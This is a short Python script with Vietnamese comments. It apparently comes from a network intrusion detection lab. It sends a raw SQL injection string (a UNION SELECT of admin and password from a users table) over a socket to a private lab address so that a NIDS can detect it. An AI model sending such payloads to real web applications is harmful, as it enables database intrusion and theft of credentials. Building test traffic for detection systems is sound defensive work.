# send_attack.py trên Máy B
import socket

target_ip = "192.168.1.25"
target_port = 80 # Hoặc bất kỳ cổng nào

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target_ip, target_port))
    # Gửi chuỗi độc hại
    attack_str = "GET /index.php?id=1' UNION SELECT admin, password FROM users--"
    s.send(attack_str.encode())
    s.close()
    print("Đã gửi gói tin tấn công.")
except:
    print("Không thể kết nối (đảm bảo port đang mở hoặc bỏ qua lỗi này, NIDS vẫn sẽ bắt được gói tin SYN)")